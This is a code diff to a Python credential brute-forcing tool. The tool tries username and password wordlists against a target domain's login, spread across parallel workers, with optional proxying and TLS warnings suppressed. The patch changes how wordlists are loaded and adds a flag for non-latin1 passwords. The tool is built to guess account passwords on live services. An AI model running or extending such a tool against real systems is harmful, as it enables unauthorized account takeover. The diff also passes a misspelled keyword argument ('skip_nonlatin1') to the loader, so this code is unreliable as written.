@@ -12,7 +12,7 @@ from colorama import init, Fore, Style
 init(autoreset=True)
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-def safe_lines(filepath):
+def safe_lines(filepath, skip_non_latin1=True):
     warned = False
     try:
         with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
@@ -20,13 +20,16 @@ def safe_lines(filepath):
                 line = line.strip()
                 if not line:
                     continue
-                try:
-                    line.encode('latin1')
+                if skip_non_latin1:
+                    try:
+                        line.encode('latin1')
+                        yield line
+                    except UnicodeEncodeError:
+                        if not warned:
+                            print(Fore.YELLOW + f"[!] Skipping unsupported lines in '{filepath}' (non-latin1).")
+                            warned = True
+                else:
                     yield line
-                except UnicodeEncodeError:
-                    if not warned:
-                        print(Fore.YELLOW + f"[!] Skipping unsupported lines in '{filepath}' (non-latin1).")
-                        warned = True
     except FileNotFoundError:
         print(Fore.RED + f"[!] File Not Found: {filepath}")
         sys.exit(1)
@@ -72,7 +75,7 @@ def try_login(domain, username, password, proxy, shared, lock):
         else:
             print(Fore.YELLOW + f"\n[?] UNKNOWN: {username}:{password} → Status: {response.status_code}")
 
-def brute_force(domain, usernames, passfile, proxy, workers):
+def brute_force(domain, usernames, passwords, proxy, workers):
     print(Fore.BLUE + f"[+] Target: {domain}")
     print(Fore.BLUE + f"[+] Proxy: {proxy}" if proxy else Fore.BLUE + "[+] No proxy")
     print(Fore.BLUE + f"[*] Using {workers} Workers")
@@ -83,7 +86,7 @@ def brute_force(domain, usernames, passfile, proxy, workers):
     tasks = []
 
     for username in usernames:
-        for password in safe_lines(passfile):
+        for password in passwords:
             shared['total'] += 1
             tasks.append((domain, username, password, proxy, shared, lock))
 
@@ -119,6 +122,7 @@ def main():
     parser.add_argument("-P", "--passfile", required=True, help="Password wordlist file")
     parser.add_argument("-x", "--proxy", help="Proxy (e.g. http://127.0.0.1:8080)")
     parser.add_argument("-w", "--workers", type=int, default=cpu_count(), help="Number of processes to use")
+    parser.add_argument("--allow-nonlatin", action="store_true", help="Allow passwords with non-latin1 characters")
 
     args = parser.parse_args()
 
@@ -131,10 +135,20 @@ def main():
         print(Fore.RED + f"[!] Invalid password file path: {args.passfile}")
         sys.exit(1)
 
-    usernames = [args.username] if args.username else list(safe_lines(args.userfile))
+    # Load wordlists once
+    skip_nonlatin = not args.allow_nonlatin
+    passwords = list(safe_lines(args.passfile, skip_nonlatin1=skip_nonlatin))
+    usernames = [args.username] if args.username else list(safe_lines(args.userfile, skip_non_latin1=skip_nonlatin))
 
-    domain = resolve_protocol(args.domain, usernames[0], next(safe_lines(args.passfile)), args.proxy)
-    brute_force(domain, usernames, args.passfile, args.proxy, args.workers)
+    if not usernames:
+        print(Fore.RED + "[!] No valid usernames loaded.")
+        sys.exit(1)
+    if not passwords:
+        print(Fore.RED + "[!] No valid passwords loaded.")
+        sys.exit(1)
+
+    domain = resolve_protocol(args.domain, usernames[0], passwords[0], args.proxy)
+    brute_force(domain, usernames, passwords, args.proxy, args.workers)
 
 if __name__ == "__main__":
     main()
